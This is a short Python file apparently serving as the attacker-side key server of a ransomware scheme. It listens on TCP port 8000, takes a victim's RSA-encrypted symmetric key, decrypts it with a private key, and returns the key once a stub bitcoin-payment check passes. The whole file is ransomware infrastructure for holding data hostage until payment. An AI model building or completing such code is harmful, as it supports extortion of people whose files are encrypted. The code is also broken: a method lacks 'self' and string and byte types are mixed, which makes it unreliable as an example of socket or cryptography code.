import socketserver
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

class ClientHandler(socketserver.BaseRequestHandler):

    private_key_path = ""

    def bitcoin_received() -> bool:
        print("Check bitcoin")
        return True
    
    def handle(self):
        encrypted_key = (self.request.recv(1024).strip()).decode()
        print ("Decrypting " + encrypted_key )

        with open(self.private_key_path, "rb") as key_file:
            private_key = serialization.load_pem_private_key(
                key_file.read(),
                password=None
            )

        decrypted_symmetric_key = private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        if self.bitcoin_received():
            self.request.sendall(str.encode(decrypted_symmetric_key))

if __name__ == "__main__":
    HOST, PORT = "", 8000
    tcpServer = socketserver.TCPServer((HOST, PORT), ClientHandler)
    try:
        tcpServer.serve_forever()
    except:
        print("There was an error")